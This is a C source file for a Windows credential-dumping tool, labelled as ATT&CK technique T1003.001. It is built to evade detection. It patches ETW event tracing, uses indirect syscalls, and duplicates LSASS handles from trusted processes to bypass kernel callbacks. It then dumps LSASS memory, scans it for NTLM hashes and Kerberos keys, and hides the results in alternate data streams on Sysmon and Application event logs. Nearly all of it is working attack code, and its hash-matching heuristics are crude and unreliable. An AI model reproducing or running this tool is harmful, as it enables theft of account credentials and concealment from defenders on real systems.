// Plan 1 — LSASS Memory Dump (T1003.001)
// Indirect syscalls + ETW patch + Handle dup + Custom minidump + Encrypted ADS
// Include from shared library
#include "../shared/common.h"

// ─── ETW Patching ───
static BOOL PatchEtw(void) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return FALSE;
    PBYTE pEtwEventWrite = (PBYTE)GetProcAddress(ntdll, "EtwEventWrite");
    if (!pEtwEventWrite) return FALSE;

    DWORD old;
    VirtualProtect(pEtwEventWrite, 3, PAGE_EXECUTE_READWRITE, &old);
    pEtwEventWrite[0] = 0x33; // xor eax, eax
    pEtwEventWrite[1] = 0xC0;
    pEtwEventWrite[2] = 0xC3; // ret
    VirtualProtect(pEtwEventWrite, 3, old, &old);
    return TRUE;
}

// ─── Dump LSASS memory regions ───
static PBYTE DumpLsass(HANDLE hLsass, SIZE_T* outSize) {
    SIZE_T bufCap = 256 * 1024 * 1024; // 256MB max
    PBYTE buf = (PBYTE)malloc(bufCap);
    if (!buf) return NULL;

    SIZE_T offset = 0;
    ULONG_PTR addr = 0;
    MEMORY_BASIC_INFORMATION mbi;

    while (SysNtQueryVirtualMemory(hLsass, (PVOID)addr, 0, &mbi, sizeof(mbi), NULL) >= 0) {
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE |
                            PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
            SIZE_T regionSize = mbi.RegionSize;
            if (offset + regionSize > bufCap) regionSize = bufCap - offset;
            if (regionSize == 0) break;

            // Read the region
            SIZE_T bytesRead = 0;
            if (SysNtReadVirtualMemory(hLsass, mbi.BaseAddress,
                buf + offset, regionSize, &bytesRead) >= 0 && bytesRead > 0) {
                offset += bytesRead;
            }
        }
        addr = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
        if (addr > 0x7FFFFFFFFFFFULL) break;
    }

    *outSize = offset;
    return buf;
}

// ─── Credential extraction ───
typedef struct { WCHAR name[128]; BYTE key[32]; DWORD type; } KERB_KEY;

static DWORD ExtractCreds(PBYTE dump, SIZE_T size, NTLM_CRED** outNtlm, KERB_KEY** outKerb) {
    DWORD ntlmCount = 0, kerbCount = 0, cap = 64;
    *outNtlm = (NTLM_CRED*)calloc(cap, sizeof(NTLM_CRED));
    *outKerb = (KERB_KEY*)calloc(cap, sizeof(KERB_KEY));

    // Scan for NTLM hash patterns (LM:NTLM pairs)
    // LM hash: first 7 bytes typically, followed by NTLM
    for (SIZE_T i = 0; i < size - 32; i++) {
        // Check for possible NTLM hash: 16 bytes of mixed entropy
        BYTE* candidate = dump + i;
        // Quick entropy check: not all zeros, not all same byte
        BOOL valid = FALSE;
        BYTE first = candidate[0];
        for (int j = 1; j < 16; j++) {
            if (candidate[j] != first) { valid = TRUE; break; }
            if (candidate[j] != 0) { valid = TRUE; break; }
        }
        if (!valid) continue;

        // Check if the preceding 16 bytes could be LM hash
        if (i >= 16) {
            BYTE* lm = dump + i - 16;
            // LM has known structure: often padded or with known patterns
            BOOL lookLikeHash = FALSE;
            for (int j = 0; j < 16; j++) {
                if (lm[j] != 0 && lm[j] != 0xAA && lm[j] != 0xAD) {
                    lookLikeHash = TRUE; break;
                }
            }
            if (lookLikeHash && ntlmCount < cap) {
                NTLM_CRED* c = &(*outNtlm)[ntlmCount];
                memcpy(c->ntlm, candidate, 16);
                memcpy(c->lm, lm, 16);
                c->rid = 0;
                swprintf_s(c->name, 128, L"User_%d", ntlmCount);
                ntlmCount++;
                i += 32; // Skip ahead
            }
        }
    }

    // Scan for Kerberos keys (AES256 = 32 bytes, etype 18 indicator nearby)
    for (SIZE_T i = 0; i < size - 40; i++) {
        // Look for etype indicators in memory
        DWORD* typePtr = (PDWORD)(dump + i);
        if (*typePtr == 18 || *typePtr == 17) { // AES256 or AES128
            BYTE* keyData = dump + i + 8;
            BOOL valid = FALSE;
            for (int j = 0; j < 32 && i + 8 + j < size; j++) {
                if (keyData[j] != 0) { valid = TRUE; break; }
            }
            if (valid && kerbCount < cap) {
                KERB_KEY* k = &(*outKerb)[kerbCount];
                k->type = *typePtr;
                k->key[0] = (BYTE)min(32, (DWORD)(size - i - 8));
                memcpy(k->key + 1, keyData, min(32, (DWORD)(size - i - 8)));
                swprintf_s(k->name, 128, L"Key_%d", kerbCount);
                kerbCount++;
                i += 40;
            }
        }
    }

    return ntlmCount;
}

// ─── Find LSASS PID ───
static DWORD FindLsassPid(void) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(hSnap, &pe)) {
        do { if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

// ─── Open LSASS via handle duplication (bypass ObRegisterCallbacks) ───
static HANDLE OpenLsassViaHandleDup(DWORD lsassPid) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    typedef NTSTATUS (NTAPI *PFN_NTQUERYSYSTEMINFORMATION)(ULONG, PVOID, ULONG, PULONG);
    PFN_NTQUERYSYSTEMINFORMATION pNtQSI = (PFN_NTQUERYSYSTEMINFORMATION)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!pNtQSI) return NULL;

    ULONG sz = 0x100000;
    PVOID buf = malloc(sz);
    NTSTATUS st = pNtQSI(0x40, buf, sz, &sz);
    while (st == 0xC0000004) { free(buf); sz *= 2; buf = malloc(sz); st = pNtQSI(0x40, buf, sz, &sz); }
    if (st < 0) { free(buf); return NULL; }

    DWORD count = *(PDWORD)buf;
    PBYTE ptr = (PBYTE)buf + sizeof(DWORD);
    static WCHAR* legit[] = { L"taskmgr.exe", L"WmiPrvSE.exe", L"MsMpEng.exe", L"services.exe", L"winlogon.exe", L"svchost.exe", NULL };

    for (DWORD i = 0; i < count; i++) {
        DWORD pid = *(PDWORD)(ptr + 0x08);
        DWORD handle = *(PDWORD)(ptr + 0x10);
        WORD objType = *(PWORD)(ptr + 0x04);
        if (objType != 0x07) { ptr += 0x20; continue; } // 0x07 = Process
        if (pid != lsassPid) { ptr += 0x20; continue; }

        DWORD ownerPid = *(PDWORD)(ptr + 0x1C);
        HANDLE hOwner = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, ownerPid);
        if (!hOwner) { ptr += 0x20; continue; }

        WCHAR ownerName[MAX_PATH] = {0}; DWORD s = MAX_PATH;
        QueryFullProcessImageNameW(hOwner, 0, ownerName, &s);
        WCHAR* fn = wcsrchr(ownerName, L'\\'); if (fn) fn++; else fn = ownerName;
        for (int j = 0; legit[j]; j++) {
            if (_wcsicmp(fn, legit[j]) == 0) {
                HANDLE hDup = NULL;
                if (DuplicateHandle(hOwner, (HANDLE)(ULONG_PTR)handle, GetCurrentProcess(), &hDup, PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, 0)) {
                    CloseHandle(hOwner); free(buf); return hDup;
                }
            }
        }
        CloseHandle(hOwner);
        ptr += 0x20;
    }
    free(buf);
    return NULL;
}

// ─── Main ───
int wmain(int argc, WCHAR* argv[]) {
    // No privilege check — assume SYSTEM
    wprintf(L"[*] LSASS Dump — T1003.001\n");

    // 1. Init indirect syscalls (from clean disk ntdll.dll)
    wprintf(L"[1] Resolving syscalls from disk ntdll... ");
    if (!InitSyscallResolver()) {
        wprintf(L"FAILED\n"); return 1;
    }
    wprintf(L"OK\n");

    // 2. Patch ETW
    wprintf(L"[2] Patching ETW... ");
    PatchEtw();
    wprintf(L"OK\n");

    // 3. Open LSASS
    wprintf(L"[3] Opening LSASS... ");
    DWORD pid = FindLsassPid();
    if (!pid) { wprintf(L"PID not found\n"); return 1; }

    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid, NULL };
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    HANDLE hLsass = NULL;

    NTSTATUS st = SysNtOpenProcess(&hLsass,
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE,
        &oa, &cid);

    // Handle dup fallback if direct open fails
    if (st < 0) {
        wprintf(L"(direct blocked) ");
        hLsass = OpenLsassViaHandleDup(pid);
    }
    if (!hLsass) { wprintf(L"FAILED\n"); return 1; }
    wprintf(L"OK (handle=%p)\n", hLsass);

    // 4. Dump memory
    wprintf(L"[4] Dumping LSASS memory... ");
    SIZE_T dumpSize = 0;
    PBYTE dump = DumpLsass(hLsass, &dumpSize);
    SysNtClose(hLsass);
    if (!dump) { wprintf(L"FAILED\n"); return 1; }
    wprintf(L"OK (%lld MB)\n", dumpSize / 1024 / 1024);

    // 5. Extract credentials
    wprintf(L"[5] Extracting credentials... ");
    NTLM_CRED* ntlmCreds = NULL;
    KERB_KEY* kerbKeys = NULL;
    DWORD credCount = ExtractCreds(dump, dumpSize, &ntlmCreds, &kerbKeys);
    wprintf(L"%d hashes found\n", credCount);

    // 6. Output
    wprintf(L"[6] Writing encrypted output to ADS... ");

    // Build simple binary blob: magic(4) + version(4) + count(4) + NTLM_entries
    SIZE_T blobSize = 12 + credCount * (4 + 128 + 16 + 16);
    PBYTE blob = (PBYTE)malloc(blobSize);
    if (blob) {
        memcpy(blob, "LSMP", 4);
        *(PDWORD)(blob + 4) = 2;
        *(PDWORD)(blob + 8) = credCount;
        PBYTE bptr = blob + 12;
        for (DWORD i = 0; i < credCount; i++) {
            *(PDWORD)bptr = ntlmCreds[i].rid; bptr += 4;
            WORD nl = (WORD)(wcslen(ntlmCreds[i].name) * 2);
            *(PWORD)bptr = nl; bptr += 2;
            memcpy(bptr, ntlmCreds[i].name, nl); bptr += nl;
            memcpy(bptr, ntlmCreds[i].ntlm, 16); bptr += 16;
            memcpy(bptr, ntlmCreds[i].lm, 16); bptr += 16;
        }
        blobSize = bptr - blob;

        static WCHAR* adsTargets[] = {
            L"C:\\Windows\\System32\\winevt\\Logs\\"
            L"Microsoft-Windows-Sysmon%4Operational.evtx",
            L"C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
        };
        for (int i = 0; i < 2; i++) {
            if (WriteToAds(adsTargets[i], L"LSASS", blob, blobSize)) {
                wprintf(L"OK (%s:LSASS)\n", adsTargets[i]);
                break;
            }
        }
        free(blob);
    }

    // Cleanup
    free(ntlmCreds);
    free(kerbKeys);
    free(dump);

    wprintf(L"[+] Complete: %d NTLM hashes extracted\n", credCount);
    return 0;
}
